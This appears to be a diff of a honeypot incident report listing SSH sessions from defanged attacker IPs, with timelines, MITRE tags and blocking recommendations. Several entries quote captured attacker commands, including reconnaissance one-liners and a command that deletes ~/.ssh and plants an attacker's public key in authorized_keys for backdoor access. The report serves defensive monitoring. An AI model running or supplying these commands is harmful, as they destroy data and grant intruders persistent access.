-| **Last Seen** | 2026-08-22 14:17 |
-| **Session Duration** | 4s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:17:49` | `cowrie.session.connect` |
-| `2026-08-22 14:17:50` | `cowrie.client.version` |
-| `2026-08-22 14:17:50` | `cowrie.client.kex` |
-| `2026-08-22 14:17:51` | `cowrie.login.success` |
-| `2026-08-22 14:17:53` | `cowrie.session.params` |
-| `2026-08-22 14:17:53` | `cowrie.command.input` |
-| `2026-08-22 14:17:53` | `cowrie.command.input` |
-| `2026-08-22 14:17:53` | `cowrie.command.input` |
-| `2026-08-22 14:17:53` | `cowrie.command.input` |
-| `2026-08-22 14:17:53` | `cowrie.command.input` |
-| `2026-08-22 14:17:53` | `cowrie.command.success` |
-| `2026-08-22 14:17:53` | `cowrie.command.input` |
-| `2026-08-22 14:17:53` | `cowrie.command.input` |
-| `2026-08-22 14:17:53` | `cowrie.command.input` |
-| `2026-08-22 14:17:53` | `cowrie.command.input` |
-| `2026-08-22 14:17:53` | `cowrie.log.closed` |
-| `2026-08-22 14:17:54` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-3649fb9bcd16
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:19 |
-| **Last Seen** | 2026-08-22 14:19 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:19:00` | `cowrie.session.connect` |
-| `2026-08-22 14:19:01` | `cowrie.client.version` |
-| `2026-08-22 14:19:01` | `cowrie.client.kex` |
-| `2026-08-22 14:19:02` | `cowrie.login.success` |
-| `2026-08-22 14:19:03` | `cowrie.session.params` |
-| `2026-08-22 14:19:03` | `cowrie.command.input` |
-| `2026-08-22 14:19:03` | `cowrie.command.input` |
-| `2026-08-22 14:19:03` | `cowrie.command.input` |
-| `2026-08-22 14:19:03` | `cowrie.command.input` |
-| `2026-08-22 14:19:03` | `cowrie.command.input` |
-| `2026-08-22 14:19:03` | `cowrie.command.success` |
-| `2026-08-22 14:19:03` | `cowrie.command.input` |
-| `2026-08-22 14:19:03` | `cowrie.command.input` |
-| `2026-08-22 14:19:03` | `cowrie.command.input` |
-| `2026-08-22 14:19:03` | `cowrie.command.input` |
-| `2026-08-22 14:19:03` | `cowrie.log.closed` |
-| `2026-08-22 14:19:04` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-3843fdbad0dc
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 14:19 |
-| **Last Seen** | 2026-08-22 14:19 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:19:26` | `cowrie.session.connect` |
-| `2026-08-22 14:19:26` | `cowrie.client.version` |
-| `2026-08-22 14:19:26` | `cowrie.client.kex` |
-| `2026-08-22 14:19:27` | `cowrie.login.success` |
-| `2026-08-22 14:19:27` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:19:27` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 14:19:27` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 14:19:27` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-641b3c581d89
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 14:19 |
-| **Last Seen** | 2026-08-22 14:19 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:19:30` | `cowrie.session.connect` |
-| `2026-08-22 14:19:30` | `cowrie.client.version` |
-| `2026-08-22 14:19:30` | `cowrie.client.kex` |
-| `2026-08-22 14:19:31` | `cowrie.login.success` |
-| `2026-08-22 14:19:31` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:19:31` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 14:19:31` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 14:19:31` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-3e90bcbf789c
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `91.132.196[.]49` |
-| **First Seen** | 2026-08-22 14:20 |
-| **Last Seen** | 2026-08-22 14:20 |
-| **Session Duration** | 5s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:20:30` | `cowrie.session.connect` |
-| `2026-08-22 14:20:30` | `cowrie.client.version` |
-| `2026-08-22 14:20:30` | `cowrie.client.kex` |
-| `2026-08-22 14:20:31` | `cowrie.login.success` |
-| `2026-08-22 14:20:31` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:20:36` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `91.132.196[.]49` to AbuseIPDB if not already reported
-- [ ] Block `91.132.196[.]49` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-7f0dbdc7f05b
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `103.193.179[.]139` |
-| **First Seen** | 2026-08-22 14:20 |
-| **Last Seen** | 2026-08-22 14:20 |
-| **Session Duration** | 7s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:20:35` | `cowrie.session.connect` |
-| `2026-08-22 14:20:35` | `cowrie.client.version` |
-| `2026-08-22 14:20:35` | `cowrie.client.kex` |
-| `2026-08-22 14:20:36` | `cowrie.login.success` |
-| `2026-08-22 14:20:37` | `cowrie.session.params` |
-| `2026-08-22 14:20:37` | `cowrie.command.input` |
-| `2026-08-22 14:20:37` | `cowrie.command.failed` |
-| `2026-08-22 14:20:38` | `cowrie.log.closed` |
-| `2026-08-22 14:20:39` | `cowrie.session.params` |
-| `2026-08-22 14:20:39` | `cowrie.command.input` |
-| `2026-08-22 14:20:39` | `cowrie.session.file_download` |
-| `2026-08-22 14:20:39` | `cowrie.log.closed` |
-| `2026-08-22 14:20:43` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `103.193.179[.]139` to AbuseIPDB if not already reported
-- [ ] Block `103.193.179[.]139` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Run Tool 31 malware analyzer on captured payload(s)
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-2bf0b9a3ca5e
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `222.92.61[.]242` |
-| **First Seen** | 2026-08-22 14:20 |
-| **Last Seen** | 2026-08-22 14:20 |
-| **Session Duration** | 10s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:20:37` | `cowrie.session.connect` |
-| `2026-08-22 14:20:38` | `cowrie.client.version` |
-| `2026-08-22 14:20:38` | `cowrie.client.kex` |
-| `2026-08-22 14:20:41` | `cowrie.login.success` |
-| `2026-08-22 14:20:42` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:20:47` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `222.92.61[.]242` to AbuseIPDB if not already reported
-- [ ] Block `222.92.61[.]242` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-bb277abdd7ff
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `103.193.179[.]139` |
-| **First Seen** | 2026-08-22 14:20 |
-| **Last Seen** | 2026-08-22 14:20 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:20:39` | `cowrie.session.connect` |
-| `2026-08-22 14:20:39` | `cowrie.client.version` |
-| `2026-08-22 14:20:40` | `cowrie.client.kex` |
-| `2026-08-22 14:20:41` | `cowrie.login.success` |
-| `2026-08-22 14:20:41` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `103.193.179[.]139` to AbuseIPDB if not already reported
-- [ ] Block `103.193.179[.]139` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-6fb54aa6a327
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `103.193.179[.]139` |
-| **First Seen** | 2026-08-22 14:20 |
-| **Last Seen** | 2026-08-22 14:20 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:20:41` | `cowrie.session.connect` |
-| `2026-08-22 14:20:41` | `cowrie.client.version` |
-| `2026-08-22 14:20:41` | `cowrie.client.kex` |
-| `2026-08-22 14:20:42` | `cowrie.login.success` |
-| `2026-08-22 14:20:43` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `103.193.179[.]139` to AbuseIPDB if not already reported
-- [ ] Block `103.193.179[.]139` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-ac4c81d59cc6
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `153.37.177[.]219` |
-| **First Seen** | 2026-08-22 14:23 |
-| **Last Seen** | 2026-08-22 14:24 |
-| **Session Duration** | 10s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:23:54` | `cowrie.session.connect` |
-| `2026-08-22 14:23:56` | `cowrie.client.version` |
-| `2026-08-22 14:23:56` | `cowrie.client.kex` |
-| `2026-08-22 14:23:58` | `cowrie.login.success` |
-| `2026-08-22 14:23:59` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:24:04` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
-- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8ccb7921ee0a
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `188.147.254[.]153` |
-| **First Seen** | 2026-08-22 14:24 |
-| **Last Seen** | 2026-08-22 14:24 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:24:05` | `cowrie.session.connect` |
-| `2026-08-22 14:24:05` | `cowrie.client.version` |
-| `2026-08-22 14:24:05` | `cowrie.client.kex` |
-| `2026-08-22 14:24:06` | `cowrie.login.success` |
-| `2026-08-22 14:24:06` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:24:11` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `188.147.254[.]153` to AbuseIPDB if not already reported
-- [ ] Block `188.147.254[.]153` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-90bc18399079
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `182.118.64[.]225` |
-| **First Seen** | 2026-08-22 14:27 |
-| **Last Seen** | 2026-08-22 14:32 |
-| **Session Duration** | 304s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:27:01` | `cowrie.session.connect` |
-| `2026-08-22 14:27:04` | `cowrie.client.version` |
-| `2026-08-22 14:27:04` | `cowrie.client.kex` |
-| `2026-08-22 14:27:06` | `cowrie.login.success` |
-| `2026-08-22 14:27:07` | `cowrie.session.params` |
-| `2026-08-22 14:27:07` | `cowrie.command.input` |
-| `2026-08-22 14:27:07` | `cowrie.command.failed` |
-| `2026-08-22 14:27:07` | `cowrie.log.closed` |
-| `2026-08-22 14:27:08` | `cowrie.session.params` |
-| `2026-08-22 14:27:08` | `cowrie.command.input` |
-| `2026-08-22 14:27:09` | `cowrie.session.file_download` |
-| `2026-08-22 14:27:09` | `cowrie.log.closed` |
-| `2026-08-22 14:32:06` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `182.118.64[.]225` to AbuseIPDB if not already reported
-- [ ] Block `182.118.64[.]225` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Run Tool 31 malware analyzer on captured payload(s)
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-2ee0891ff3b3
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `81.215.2[.]43` |
-| **First Seen** | 2026-08-22 14:28 |
-| **Last Seen** | 2026-08-22 14:29 |
-| **Session Duration** | 6s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:28:54` | `cowrie.session.connect` |
-| `2026-08-22 14:28:54` | `cowrie.client.version` |
-| `2026-08-22 14:28:54` | `cowrie.client.kex` |
-| `2026-08-22 14:28:55` | `cowrie.login.success` |
-| `2026-08-22 14:28:56` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:29:00` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `81.215.2[.]43` to AbuseIPDB if not already reported
-- [ ] Block `81.215.2[.]43` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-845215cd7e04
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 14:29 |
-| **Last Seen** | 2026-08-22 14:29 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:29:25` | `cowrie.session.connect` |
-| `2026-08-22 14:29:25` | `cowrie.client.version` |
-| `2026-08-22 14:29:25` | `cowrie.client.kex` |
-| `2026-08-22 14:29:26` | `cowrie.login.success` |
-| `2026-08-22 14:29:26` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:29:26` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 14:29:26` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 14:29:26` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-938fed417d03
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 14:29 |
-| **Last Seen** | 2026-08-22 14:29 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:29:30` | `cowrie.session.connect` |
-| `2026-08-22 14:29:30` | `cowrie.client.version` |
-| `2026-08-22 14:29:31` | `cowrie.client.kex` |
-| `2026-08-22 14:29:31` | `cowrie.login.success` |
-| `2026-08-22 14:29:32` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:29:32` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 14:29:32` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 14:29:32` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-d2a0d83ba1c0
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `2.180.7[.]125` |
-| **First Seen** | 2026-08-22 14:39 |
-| **Last Seen** | 2026-08-22 14:39 |
-| **Session Duration** | 7s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:39:02` | `cowrie.session.connect` |
-| `2026-08-22 14:39:03` | `cowrie.client.version` |
-| `2026-08-22 14:39:03` | `cowrie.client.kex` |
-| `2026-08-22 14:39:04` | `cowrie.login.success` |
-| `2026-08-22 14:39:05` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:39:10` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `2.180.7[.]125` to AbuseIPDB if not already reported
-- [ ] Block `2.180.7[.]125` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-04180d936f6e
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `138.118.215[.]192` |
-| **First Seen** | 2026-08-22 14:39 |
-| **Last Seen** | 2026-08-22 14:39 |
+| **Source IP** | `182.42.113[.]10` |
+| **First Seen** | 2026-08-22 16:49 |
+| **Last Seen** | 2026-08-22 16:50 |
 | **Session Duration** | 9s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -6046,27 +4730,60 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 14:39:14` | `cowrie.session.connect` |
-| `2026-08-22 14:39:16` | `cowrie.client.version` |
-| `2026-08-22 14:39:16` | `cowrie.client.kex` |
-| `2026-08-22 14:39:18` | `cowrie.login.success` |
-| `2026-08-22 14:39:19` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:39:24` | `cowrie.session.closed` |
+| `2026-08-22 16:49:58` | `cowrie.session.connect` |
+| `2026-08-22 16:49:59` | `cowrie.client.version` |
+| `2026-08-22 16:49:59` | `cowrie.client.kex` |
+| `2026-08-22 16:50:02` | `cowrie.login.success` |
+| `2026-08-22 16:50:03` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:50:07` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `138.118.215[.]192` to AbuseIPDB if not already reported
-- [ ] Block `138.118.215[.]192` at perimeter firewall / security group
+- [ ] Submit `182.42.113[.]10` to AbuseIPDB if not already reported
+- [ ] Block `182.42.113[.]10` at perimeter firewall / security group
 - [ ] Investigate TCP tunnel target — port forwarding via honeypot
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-12ba3cfeadaa
+### 🔴 HIGH · IR-92f56b7eae14
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `218.29.196[.]162` |
-| **First Seen** | 2026-08-22 14:39 |
-| **Last Seen** | 2026-08-22 14:39 |
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 16:50 |
+| **Last Seen** | 2026-08-22 16:50 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:50:02` | `cowrie.session.connect` |
+| `2026-08-22 16:50:02` | `cowrie.client.version` |
+| `2026-08-22 16:50:02` | `cowrie.client.kex` |
+| `2026-08-22 16:50:03` | `cowrie.login.success` |
+| `2026-08-22 16:50:03` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:50:03` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 16:50:03` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 16:50:04` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-3f6f5c66348d
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `203.252.10[.]4` |
+| **First Seen** | 2026-08-22 16:50 |
+| **Last Seen** | 2026-08-22 16:50 |
 | **Session Duration** | 8s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -6077,27 +4794,27 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 14:39:15` | `cowrie.session.connect` |
-| `2026-08-22 14:39:16` | `cowrie.client.version` |
-| `2026-08-22 14:39:16` | `cowrie.client.kex` |
-| `2026-08-22 14:39:18` | `cowrie.login.success` |
-| `2026-08-22 14:39:19` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:39:24` | `cowrie.session.closed` |
+| `2026-08-22 16:50:08` | `cowrie.session.connect` |
+| `2026-08-22 16:50:09` | `cowrie.client.version` |
+| `2026-08-22 16:50:09` | `cowrie.client.kex` |
+| `2026-08-22 16:50:11` | `cowrie.login.success` |
+| `2026-08-22 16:50:12` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:50:17` | `cowrie.session.closed` |
 
